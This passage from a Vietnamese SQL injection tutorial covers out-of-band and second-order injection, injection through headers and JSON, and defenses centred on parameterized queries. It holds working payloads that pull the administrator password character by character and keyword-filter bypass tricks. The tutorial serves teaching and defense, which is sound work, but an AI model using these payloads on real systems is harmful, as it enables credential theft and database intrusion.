    `' || (SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN (XML_PAYLOAD_HERE) ELSE '' END FROM users WHERE username='administrator')--`
    Nếu ký tự đầu tiên là 'a', server Collaborator sẽ nhận được một HTTP request từ máy chủ cơ sở dữ liệu, xác nhận điều kiện là đúng.

---

# PHẦN 6: CÁC NGỮ CẢNH NÂNG CAO VÀ CÁCH PHÒNG CHỐNG

Phần này sẽ đề cập đến các dạng SQL Injection phức tạp hơn, không xảy ra ngay lập tức và các phương pháp phòng thủ hiệu quả nhất mà các lập trình viên nên áp dụng.

## 6.1. Second-order SQL Injection (SQL Injection bậc hai)

#### A. Second-order SQLi là gì?
**Second-order SQL Injection** (còn gọi là Stored SQL Injection) là một dạng tấn công mà trong đó, dữ liệu độc hại do kẻ tấn công cung cấp không được thực thi ngay lập tức. Thay vào đó, nó được ứng dụng **lưu trữ** lại (ví dụ: trong cơ sở dữ liệu) và chỉ được thực thi khi một chức năng khác của ứng dụng gọi và sử dụng dữ liệu đã lưu này.

> 💡 **Deep Dive: So sánh với SQLi thông thường (First-order)**
> *   **First-order SQLi:** Bạn tiêm payload -> Ứng dụng xử lý và trả về kết quả ngay trong cùng một HTTP request/response. Tấn công và hậu quả xảy ra gần như tức thời.
> *   **Second-order SQLi:**
>     *   **Bước 1 (Injection):** Bạn tiêm một payload vào một chức năng (ví dụ: "Cập nhật tên hiển thị"). Ứng dụng lúc này chỉ đơn thuần lưu chuỗi độc hại vào DB mà không thực thi nó. Phản hồi HTTP ở bước này hoàn toàn bình thường.
>     *   **Bước 2 (Execution):** Bạn truy cập một chức năng khác (ví dụ: "Trang chào mừng người dùng"). Chức năng này đọc tên hiển thị từ DB để hiển thị lời chào, và lúc này, payload độc hại mới được đưa vào một câu lệnh SQL khác và được thực thi.

#### B. Ví dụ thực tế
Hãy xem xét một ứng dụng cho phép người dùng thay đổi tên hiển thị (display name).

**Bước 1: Lưu trữ Payload (Injection)**
Kẻ tấn công cập nhật tên hiển thị của mình thành:
`MyName' AND (SELECT password FROM users WHERE username = 'administrator') = 'anything`

*   Ứng dụng nhận chuỗi này và thực hiện một câu lệnh `UPDATE` an toàn (ví dụ: sử dụng parameterized query).
    ```sql
    UPDATE users SET display_name = ? WHERE user_id = 123; 
    -- '?' sẽ được thay bằng chuỗi "MyName' AND (SELECT..." một cách an toàn.
    ```
*   Lúc này, chuỗi độc hại đã nằm yên trong cơ sở dữ liệu.

**Bước 2: Kích hoạt Payload (Execution)**
Sau đó, kẻ tấn công truy cập vào trang "Tài khoản của tôi", nơi ứng dụng có một chức năng hiển thị lời chào. Chức năng này đọc tên hiển thị từ DB và sử dụng nó trong một câu lệnh SQL khác, nhưng lần này lại được viết một cách **không an toàn**.

*   Câu lệnh SQL không an toàn:
    ```sql
    $displayName = //...đọc tên từ DB...
    $sql = "SELECT * FROM user_greetings WHERE greeting_owner = '" + $displayName + "'";
    ```
*   Khi thay `$displayName` bằng chuỗi đã lưu, câu lệnh cuối cùng trở thành:
    ```sql
    SELECT * FROM user_greetings WHERE greeting_owner = 'MyName' AND (SELECT password FROM users WHERE username = 'administrator') = 'anything'
    ```*   **Hậu quả:** Câu lệnh này sẽ được thực thi. Mặc dù nó không trả về dữ liệu gì, nhưng nếu ứng dụng có xử lý lỗi hoặc thay đổi hành vi dựa trên kết quả truy vấn, kẻ tấn công có thể khai thác nó theo kiểu Blind SQLi.

**Tại sao khó phát hiện?**
*   Các công cụ quét tự động (scanners) thường bỏ sót vì chúng chỉ tìm kiếm phản hồi bất thường ngay sau khi gửi payload.
*   Lập trình viên khi kiểm tra chức năng "Cập nhật tên" sẽ thấy nó hoàn toàn an toàn, mà không nhận ra rằng dữ liệu đó sẽ được sử dụng một cách nguy hiểm ở một nơi khác.

---

## 6.2. SQL Injection trong các ngữ cảnh khác (Different Contexts)
SQLi không chỉ giới hạn ở các tham số URL hay form. Nó có thể xảy ra ở bất cứ đâu dữ liệu người dùng được đưa vào câu lệnh SQL.

*   **HTTP Headers:** Các header như `User-Agent`, `Referer`, `X-Forwarded-For` thường được các ứng dụng lưu vào cơ sở dữ liệu để phục vụ cho việc thống kê, phân tích. Nếu quá trình lưu này không an toàn, SQLi có thể xảy ra.
*   **Dữ liệu JSON/XML:** Các API hiện đại thường xuyên nhận dữ liệu dưới dạng JSON hoặc XML. Nếu máy chủ phân tích các cấu trúc này và sau đó xây dựng câu lệnh SQL bằng cách nối chuỗi, lỗ hổng có thể xuất hiện.
    *   **Ví dụ JSON:**
        ```json
        {"username": "admin'--", "password": "123"}
        ```

---

## 6.3. Cách phòng chống SQL Injection (How to prevent SQL injection)
Đây là phần quan trọng nhất. Việc sửa lỗi SQLi không phải là "lọc" hay "chặn" các ký tự đặc biệt, mà là thay đổi hoàn toàn cách ứng dụng tương tác với cơ sở dữ liệu.

#### A. Phương pháp hiệu quả nhất: Sử dụng Parameterized Queries
**Parameterized Queries** (còn gọi là Prepared Statements) là cách phòng chống SQLi hiệu quả và được khuyến nghị hàng đầu.

*   **Nguyên lý hoạt động:**
    1.  **Định nghĩa trước (Define):** Lập trình viên gửi cho cơ sở dữ liệu một khuôn mẫu (template) của câu lệnh SQL, sử dụng các dấu hỏi `?` hoặc các biến giữ chỗ (placeholders) thay cho dữ liệu người dùng.
        ```java
        String sql = "SELECT * FROM users WHERE username = ?";
        ```
    2.  **Chuẩn bị (Prepare):** Cơ sở dữ liệu nhận khuôn mẫu này, phân tích cú pháp và biên dịch nó mà **chưa cần biết** dữ liệu người dùng là gì. Nó đã hiểu rõ đâu là lệnh (code).
    3.  **Gắn tham số (Bind):** Sau đó, ứng dụng gửi riêng dữ liệu của người dùng. Cơ sở dữ liệu sẽ nhận dữ liệu này và chỉ coi nó là **dữ liệu thuần túy (literal data)**, không bao giờ thực thi nó như một phần của lệnh SQL, ngay cả khi nó chứa các ký tự như `'` hay `--`.

*   **Ví dụ (Java):**
    ```java
    String username = request.getParameter("username"); // Dữ liệu từ người dùng
    
    // 1. Định nghĩa khuôn mẫu
    String sql = "SELECT * FROM users WHERE username = ?";
    
    // 2. Chuẩn bị
    PreparedStatement statement = connection.prepareStatement(sql);
    
    // 3. Gắn tham số
    statement.setString(1, username); // DB biết rằng đây là dữ liệu, không phải code
    
    // 4. Thực thi
    ResultSet results = statement.executeQuery();
    ```
*   **Tại sao nó an toàn?** Vì nó tách biệt hoàn toàn **lệnh (code)** khỏi **dữ liệu (data)**. Cơ sở dữ liệu không bao giờ nhầm lẫn hai thứ này, triệt tiêu hoàn toàn gốc rễ của SQL Injection.

#### B. Các phương pháp khác (Chỉ dùng khi không thể sử dụng Parameterized Queries)

*   **Stored Procedures:** Viết logic truy vấn trong các thủ tục lưu sẵn tại DB và ứng dụng chỉ cần gọi các thủ tục này kèm theo tham số. Về bản chất, chúng cũng thực hiện việc tách biệt code và data tương tự như prepared statements.
*   **Escaping (Thoát ký tự):** Đây là phương pháp cuối cùng, kém an toàn hơn. Nó hoạt động bằng cách thêm một ký tự escape (thường là dấu `\`) vào trước các ký tự đặc biệt do người dùng cung cấp (`'` trở thành `\'`). Điều này khiến DB hiểu rằng đó là một phần của chuỗi dữ liệu, không phải ký tự điều khiển.
    *   **Rủi ro:** Rất dễ mắc sai lầm. Nếu bỏ sót một ký tự cần escape, hoặc nếu ứng dụng và DB không đồng nhất về bộ mã hóa ký tự (character encoding), kẻ tấn công vẫn có thể bypass. **Không nên dựa vào phương pháp này nếu có thể.**

**Những gì KHÔNG nên làm:**
*   **Sử dụng Blacklist:** Chặn các từ khóa như `SELECT`, `UNION`, `DELETE`... là vô ích. Kẻ tấn công có vô số cách để bypass (ví dụ: `sELecT`, `UNI/**/ON`, mã hóa ký tự...).
*   **Tự viết hàm lọc:** Đây là một cuộc chiến không cân sức mà bạn gần như chắc chắn sẽ thua.
